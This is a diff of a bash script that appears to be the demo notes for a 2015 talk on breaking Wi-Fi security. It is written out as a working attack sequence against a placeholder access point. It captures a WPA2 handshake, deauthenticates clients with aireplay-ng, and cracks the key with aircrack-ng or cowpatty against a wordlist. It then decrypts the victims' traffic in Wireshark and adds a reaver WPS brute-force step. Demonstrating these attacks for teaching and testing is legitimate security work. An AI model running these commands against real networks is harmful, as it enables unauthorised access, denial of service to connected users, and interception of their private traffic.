@@ -1,23 +1,33 @@
 #!/bin/bash
 # Tested on Kali GNU/Linux 1.1.0 as of 2015-07-06
 
+## Configure the router to use WPA2-PSK
+
 ## Another way to scan the airwaves
 ifconfig wlan0 up
 iwlist wlan0 scanning
 
 ## Listen for a handshake (Deauth as necessary)
+service network-manager stop
+airmon-ng start wlan0 6
 airodump-ng mon0 --bssid <Test AP> --channel 6 --write /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo
-aireplay-ng -0 1 -a <Test AP> -c <Test Client) mon0
+aireplay-ng -0 20 -a <Test AP> -c <Test Client) -e <ESSID> mon0
 
-## Crack the handshake
-aircrack-ng /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo -w /usr/share/wordlists/fasttrack.txt
+## Crack the handshake (One or the other)
+aircrack-ng /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo-01.cap -w /usr/share/wordlists/fasttrack.txt
+cowpatty -f /usr/share/wordlists/fasttrack.txt -r /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo-01.cap -s <ESSID>
 
-## Watch their traffic
-wireshark
+## Review their traffic
+wireshark /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo-01.cap
 # Edit > Preferences > Protocols > IEEE 802.11.  Check Enable Decryption, Add a decryption key.  WPA-PWD is $Password:$SSID (Wildcard SSIDs are an option), where WPA-PSK is the raw key
 # Enter a filter to show specific traffic
 http.host matches "google\.com$"
 ip.dst_host eq www.google.com
 
+## WPS to bypass the WPA2-PSK security
+reaver -i mon0 -b <Test AP> -c 6 -vv
+
 ## Cleanup
-rm /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo
+airmon-ng stop mon0
+rm /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo-01.{cap,csv,kismet}*
+service network-manager start
